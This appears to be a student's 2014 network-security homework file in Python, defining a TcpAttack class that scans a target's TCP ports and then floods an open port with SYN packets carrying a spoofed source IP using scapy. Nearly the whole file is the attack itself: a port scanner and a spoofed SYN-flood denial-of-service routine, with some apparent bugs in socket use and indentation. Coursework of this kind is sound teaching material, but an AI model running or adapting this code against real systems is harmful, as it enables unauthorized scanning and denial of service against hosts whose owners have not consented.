#!/usr/bin/env python

##Homework Number: 8
##Name: Adam Bahrainwala
##ECN Login: abahrain
##Due Date: 27/03/2014

from socket import *
from scapy.all import *
import sys
import random

class TcpAttack:
	def __init__(self,spoofIP,targetIP):
		self.spoofIP = gethostbyname(spoofIP)
		self.targetIP = gethostbyname(targetIP)

	def scanTarget(self,rangeStart,rangeEnd):
		ports = open("openport.txt","w")
		for x in range(rangeStart,rangeEnd):
			s = socket.socket(AF_INET, SOCK_STREAM)
			result = s.connect_ex((self.targetIP, x))
			if(result == 0) :
				ports.write('%d\n' % x)
        	s.close()

	def attackTarget(self,port):
		attack = 0
		s = socket.socket(AF_INET, SOCK_STREAM)
		result = s.connect_ex((self.targetIP, port))
		s.close()
		if(result == 0) :
			attack = 1
			ip=IP(src=self.spoofIP,dst=self.targetIP)  
			SYN=TCP(sport=port,dport=port,flags="S")
			s = socket.socket(AF_INET,SOCK_STREAM)			
			for i in range(0,200):
				s.connect_ex((self.targetIP, port))
				send(ip/SYN,verbose=0)
		return attack

